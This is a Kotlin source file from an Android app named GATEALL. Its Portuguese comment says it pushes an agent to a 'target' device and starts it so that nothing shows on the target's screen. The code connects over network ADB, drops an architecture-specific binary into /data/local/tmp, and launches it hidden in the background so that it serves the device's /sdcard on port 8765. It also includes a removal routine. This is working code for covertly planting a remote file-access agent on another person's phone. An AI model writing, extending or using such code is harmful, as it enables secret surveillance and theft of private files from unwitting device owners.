package com.gateall.app.net

import android.content.Context
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File

/**
 * Empurra o agente GATEALL pro aparelho alvo via ADB e sobe ele em background.
 * Nada aparece na tela do alvo — nem ícone, nem janela, nem notificação.
 */
class AgentInstaller(private val context: Context) {

    companion object {
        const val REMOTE_PATH = "/data/local/tmp/gateall-agent"
        const val PORT = 8765
    }

    suspend fun install(ip: String): Boolean = withContext(Dispatchers.IO) {
        val adb = AdbGateway(ip, 5555)
        if (!adb.connect()) return@withContext false

        try {
            val abi = adb.shell("getprop ro.product.cpu.abi").trim()
            val local = extractAgent(abi) ?: return@withContext false

            adb.push(local, REMOTE_PATH)
            adb.shell("chmod 755 $REMOTE_PATH")

            adb.shell("pkill -f gateall-agent 2>/dev/null")
            adb.shell(
                "nohup $REMOTE_PATH -port $PORT -root /sdcard " +
                    ">/data/local/tmp/gateall-agent.log 2>&1 &"
            )

            val probe = NetworkScanner()
            repeat(8) {
                Thread.sleep(400)
                if (probe.tcpOpen(ip, PORT, 400)) return@withContext true
            }
            false
        } finally {
            adb.close()
        }
    }

    private fun extractAgent(abi: String): File? {
        val assetName = when {
            abi.contains("arm64") -> "agent/gateall-agent-arm64"
            abi.contains("armeabi") -> "agent/gateall-agent-arm"
            abi.contains("x86_64") -> "agent/gateall-agent-x86_64"
            else -> return null
        }

        return runCatching {
            val out = File(context.cacheDir, assetName.substringAfterLast('/'))
            context.assets.open(assetName).use { input ->
                out.outputStream().use { input.copyTo(it) }
            }
            out.setExecutable(true)
            out
        }.getOrNull()
    }

    suspend fun uninstall(ip: String): Boolean = withContext(Dispatchers.IO) {
        val adb = AdbGateway(ip, 5555)
        if (!adb.connect()) return@withContext false

        try {
            adb.shell("pkill -f gateall-agent 2>/dev/null")
            adb.shell("rm -f $REMOTE_PATH")
            true
        } finally {
            adb.close()
        }
    }
}
